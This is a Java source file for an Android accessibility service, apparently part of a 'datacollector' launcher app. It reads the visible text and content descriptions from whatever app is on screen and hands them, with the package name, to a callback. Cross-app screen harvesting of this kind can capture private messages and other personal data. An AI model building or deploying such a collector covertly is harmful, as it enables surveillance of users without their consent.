package com.datacollector.android.services;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.util.Log;
import android.os.Handler;
import android.os.Looper;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * 无障碍服务类 - 改进版
 * 用于收集屏幕内容信息，增强了稳定性和错误处理
 */
public class AccessibilityDataService extends AccessibilityService {
    
    private static final String TAG = "AccessibilityDataService";
    private static AccessibilityDataService instance;
    private static ScreenContentCallback contentCallback;
    
    // 性能控制
    private static final long MIN_EVENT_INTERVAL = 300; // 增加到300ms，减少处理频率
    private static final int MAX_RECURSION_DEPTH = 15; // 减少到15，防止栈溢出
    private static final int MAX_TEXT_LENGTH = 5000; // 减少到5000，防止内存问题
    private static final int MAX_CHILD_NODES = 50; // 限制子节点数量
    
    private long lastEventTime = 0;
    private Handler mainHandler;
    private AtomicBoolean isProcessing = new AtomicBoolean(false);
    
    // 添加内存监控
    private long lastMemoryCheck = 0;
    private static final long MEMORY_CHECK_INTERVAL = 30000; // 30秒检查一次内存
    
    // 屏幕内容变化回调接口
    public interface ScreenContentCallback {
        void onScreenContentChanged(String content, String packageName);
        void onServiceError(String error); // 新增错误回调
    }
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // 性能控制：限制事件处理频率
        long currentTime = System.currentTimeMillis();
        if (currentTime - lastEventTime < MIN_EVENT_INTERVAL) {
            return;
        }
        
        // 防止并发处理
        if (!isProcessing.compareAndSet(false, true)) {
            return;
        }
        
        try {
            // 定期检查内存使用情况
            checkMemoryUsage(currentTime);
            
            processAccessibilityEvent(event);
            lastEventTime = currentTime;
        } catch (OutOfMemoryError e) {
            Log.e(TAG, "内存不足，强制垃圾回收", e);
            System.gc(); // 强制垃圾回收
            notifyError("内存不足，已尝试清理");
        } catch (StackOverflowError e) {
            Log.e(TAG, "栈溢出错误", e);
            notifyError("处理深度过大，已跳过");
        } catch (SecurityException e) {
            Log.e(TAG, "权限错误", e);
            notifyError("权限不足: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "处理无障碍事件时发生错误", e);
            notifyError("事件处理异常: " + e.getMessage());
        } finally {
            isProcessing.set(false);
        }
    }
    
    private void processAccessibilityEvent(AccessibilityEvent event) {
        // 只处理特定类型的事件，减少负载
        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED &&
            event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            return;
        }
        
        AccessibilityNodeInfo rootNode = null;
        try {
            rootNode = getRootInActiveWindow();
            if (rootNode == null) {
                return;
            }
            
            // 检查节点有效性
            if (!rootNode.refresh()) {
                Log.w(TAG, "根节点刷新失败，可能已失效");
                return;
            }
            
            // 提取屏幕文本内容
            String screenText = extractTextFromNodeSafely(rootNode);
            String packageName = getPackageNameSafely(event);
            
            // 过滤掉launcher自身的数据，避免干扰分析
            if ("com.datacollector.android".equals(packageName)) {
                Log.d(TAG, "跳过launcher自身数据收集，避免分析干扰");
                return;
            }
            
            // 内容有效性检查
            if (screenText != null && !screenText.trim().isEmpty() && 
                screenText.length() <= MAX_TEXT_LENGTH) {
                
                // 异步通知回调，避免阻塞主线程
                notifyContentChanged(screenText, packageName);
                Log.d(TAG, "屏幕内容已更新: " + packageName);
            }
            
        } catch (SecurityException e) {
            Log.e(TAG, "权限不足，无法访问屏幕内容", e);
            notifyError("权限不足: " + e.getMessage());
        } catch (OutOfMemoryError e) {
            Log.e(TAG, "内存不足", e);
            notifyError("内存不足，请重启应用");
        } catch (Exception e) {
            Log.e(TAG, "处理屏幕内容时发生未知错误", e);
            notifyError("未知错误: " + e.getMessage());
        } finally {
            // 确保节点资源被正确释放
            if (rootNode != null) {
                try {
                    rootNode.recycle();
                } catch (Exception e) {
                    Log.w(TAG, "释放根节点资源时出错", e);
                }
            }
        }
    }
    
    /**
     * 安全地从节点提取文本内容
     */
    private String extractTextFromNodeSafely(AccessibilityNodeInfo node) {
        if (node == null) {
            return "";
        }
        
        try {
            StringBuilder textBuilder = new StringBuilder();
            extractTextRecursivelySafe(node, textBuilder, 0);
            return textBuilder.toString().trim();
        } catch (Exception e) {
            Log.e(TAG, "提取文本时发生错误", e);
            return "";
        }
    }
    
    /**
     * 安全的递归提取文本 - 增加深度限制和异常处理
     */
    private void extractTextRecursivelySafe(AccessibilityNodeInfo node, StringBuilder textBuilder, int depth) {
        if (node == null || depth > MAX_RECURSION_DEPTH) {
            return;
        }
        
        try {
            // 检查节点有效性
            if (!node.refresh()) {
                return;
            }
            
            // 获取节点文本
            CharSequence text = node.getText();
            if (text != null && text.length() > 0) {
                textBuilder.append(text).append(" ");
                
                // 文本长度限制
                if (textBuilder.length() > MAX_TEXT_LENGTH) {
                    return;
                }
            }
            
            // 获取内容描述
            CharSequence contentDesc = node.getContentDescription();
            if (contentDesc != null && contentDesc.length() > 0) {
                textBuilder.append(contentDesc).append(" ");
            }
            
            // 递归遍历子节点 - 添加数量限制
            int childCount = Math.min(node.getChildCount(), MAX_CHILD_NODES);
            for (int i = 0; i < childCount && textBuilder.length() <= MAX_TEXT_LENGTH; i++) {
                AccessibilityNodeInfo child = null;
                try {
                    child = node.getChild(i);
                    if (child != null && child.refresh()) { // 检查子节点有效性
                        extractTextRecursivelySafe(child, textBuilder, depth + 1);
                    }
                } catch (IllegalStateException e) {
                    Log.w(TAG, "子节点已失效: " + i, e);
                    break; // 如果节点失效，停止处理
                } catch (Exception e) {
                    Log.w(TAG, "处理子节点时出错: " + i, e);
                } finally {
                    if (child != null) {
                        try {
                            child.recycle();
                        } catch (Exception e) {
                            Log.w(TAG, "释放子节点资源时出错", e);
                        }
                    }
                }
            }
            
        } catch (Exception e) {
            Log.w(TAG, "递归提取文本时出错，深度: " + depth, e);
        }
    }
    
    /**
     * 安全地获取包名
     */
    private String getPackageNameSafely(AccessibilityEvent event) {
        try {
            CharSequence packageName = event.getPackageName();
            return packageName != null ? packageName.toString() : "unknown";
        } catch (Exception e) {
            Log.w(TAG, "获取包名时出错", e);
            return "unknown";
        }
    }
    
    /**
     * 异步通知内容变化
     */
    private void notifyContentChanged(String content, String packageName) {
        if (contentCallback != null) {
            if (mainHandler == null) {
                mainHandler = new Handler(Looper.getMainLooper());
            }
            
            mainHandler.post(() -> {
                try {
                    contentCallback.onScreenContentChanged(content, packageName);
                } catch (Exception e) {
                    Log.e(TAG, "回调通知时发生错误", e);
                }
            });
        }
    }
    
    /**
     * 通知错误
     */
    private void notifyError(String error) {
        if (contentCallback != null) {
            if (mainHandler == null) {
                mainHandler = new Handler(Looper.getMainLooper());
            }
            
            mainHandler.post(() -> {
                try {
                    contentCallback.onServiceError(error);
                } catch (Exception e) {
                    Log.e(TAG, "错误回调时发生异常", e);
                }
            });
        }
    }
    
    @Override
    public void onInterrupt() {
        Log.w(TAG, "无障碍服务被中断");
        notifyError("服务被系统中断");
    }
    
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        isProcessing.set(false);
        
        // 重置统计信息
        lastEventTime = 0;
        lastMemoryCheck = 0;
        
        Log.i(TAG, "无障碍服务已连接");
        
        // 启动健康监控
        startHealthMonitoring();
    }
    
    /**
     * 启动健康监控
     */
    private void startHealthMonitoring() {
        if (mainHandler == null) {
            mainHandler = new Handler(Looper.getMainLooper());
        }
        
        // 每分钟检查一次服务健康状态
        mainHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    // 检查服务是否还活跃
                    if (instance != null) {
                        Log.d(TAG, "健康检查: 服务正常运行");
                        
                        // 检查是否长时间没有处理事件（可能表示有问题）
                        long currentTime = System.currentTimeMillis();
                        if (lastEventTime > 0 && (currentTime - lastEventTime) > 5 * 60 * 1000) {
                            Log.w(TAG, "警告: 超过5分钟未处理任何事件");
                        }
                        
                        // 继续下一次检查
                        if (mainHandler != null) {
                            mainHandler.postDelayed(this, 60000);
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "健康检查时出错", e);
                }
            }
        }, 60000); // 1分钟后开始第一次检查
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        
        // 清理资源
        instance = null;
        contentCallback = null;
        if (mainHandler != null) {
            mainHandler.removeCallbacksAndMessages(null);
            mainHandler = null;
        }
        isProcessing.set(false);
        
        Log.i(TAG, "无障碍服务已销毁");
    }
    
    /**
     * 获取根节点信息 - 增加安全检查
     */
    public static AccessibilityNodeInfo getRootNodeInfo() {
        if (instance != null) {
            try {
                AccessibilityNodeInfo rootNode = instance.getRootInActiveWindow();
                if (rootNode != null && rootNode.refresh()) {
                    return rootNode;
                }
            } catch (Exception e) {
                Log.e(TAG, "获取根节点时出错", e);
            }
        }
        return null;
    }
    
    /**
     * 设置屏幕内容变化回调
     */
    public static void setScreenContentCallback(ScreenContentCallback callback) {
        contentCallback = callback;
    }
    
    /**
     * 检查服务是否已连接
     */
    public static boolean isServiceConnected() {
        return instance != null;
    }
    
    /**
     * 检查内存使用情况
     */
    private void checkMemoryUsage(long currentTime) {
        if (currentTime - lastMemoryCheck < MEMORY_CHECK_INTERVAL) {
            return;
        }
        
        try {
            Runtime runtime = Runtime.getRuntime();
            long totalMemory = runtime.totalMemory();
            long freeMemory = runtime.freeMemory();
            long usedMemory = totalMemory - freeMemory;
            long maxMemory = runtime.maxMemory();
            
            double memoryUsagePercent = (double) usedMemory / maxMemory * 100;
            
            Log.d(TAG, String.format("内存使用情况: %.1f%% (%d/%d MB)", 
                                    memoryUsagePercent, 
                                    usedMemory / 1024 / 1024, 
                                    maxMemory / 1024 / 1024));
            
            // 分级内存警告和处理
            if (memoryUsagePercent > 90) {
                Log.e(TAG, "内存使用极高(" + String.format("%.1f%%", memoryUsagePercent) + ")，强制垃圾回收");
                System.gc();
                // 暂停处理一段时间，让系统恢复
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
                notifyError("内存使用极高，已强制清理并暂停处理");
            } else if (memoryUsagePercent > 80) {
                Log.w(TAG, "内存使用过高(" + String.format("%.1f%%", memoryUsagePercent) + ")，建议垃圾回收");
                System.gc();
                notifyError("内存使用过高，已执行清理");
            } else if (memoryUsagePercent > 70) {
                Log.i(TAG, "内存使用较高(" + String.format("%.1f%%", memoryUsagePercent) + ")，预警");
            }
            
            lastMemoryCheck = currentTime;
        } catch (Exception e) {
            Log.w(TAG, "检查内存使用情况时出错", e);
        }
    }
    
    /**
     * 获取服务状态信息
     */
    public static String getServiceStatus() {
        if (instance == null) {
            return "服务未连接";
        }
        
        StringBuilder status = new StringBuilder();
        status.append("服务已连接");
        
        if (instance.isProcessing.get()) {
            status.append(" - 正在处理事件");
        } else {
            status.append(" - 空闲中");
        }
        
        // 添加内存信息
        try {
            Runtime runtime = Runtime.getRuntime();
            long usedMemory = runtime.totalMemory() - runtime.freeMemory();
            long maxMemory = runtime.maxMemory();
            double memoryPercent = (double) usedMemory / maxMemory * 100;
            status.append(String.format("\n内存使用: %.1f%%", memoryPercent));
        } catch (Exception e) {
            // 忽略内存检查错误
        }
        
        return status.toString();
    }
} 